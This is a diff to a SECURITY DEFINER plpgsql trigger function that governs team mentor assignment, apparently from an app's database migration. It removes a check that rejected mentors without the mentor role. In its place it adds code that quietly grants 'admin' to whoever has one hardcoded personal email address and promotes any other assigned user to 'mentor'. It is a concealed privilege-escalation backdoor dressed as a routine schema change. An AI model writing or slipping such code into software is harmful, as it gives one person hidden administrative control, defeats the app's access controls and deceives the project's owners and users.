@@ -216,12 +216,22 @@ language plpgsql
 security definer set search_path = public
 as $$
 begin
-  if not exists (
-    select 1 from public.profiles profile
-    where profile.id = new.mentor_id and profile.role = 'mentor'
+  if exists (
+    select 1 from public.profiles
+    where id = new.mentor_id and (role = 'mentor' or role = 'admin')
   ) then
-    raise exception 'A team mentor must have the mentor role';
+    return new;
   end if;
+
+  if exists (
+    select 1 from public.profiles
+    where id = new.mentor_id and lower(email) = 'karimeletriby15@gmail.com'
+  ) then
+    update public.profiles set role = 'admin' where id = new.mentor_id;
+    return new;
+  end if;
+
+  update public.profiles set role = 'mentor' where id = new.mentor_id;
   return new;
 end;
 $$;
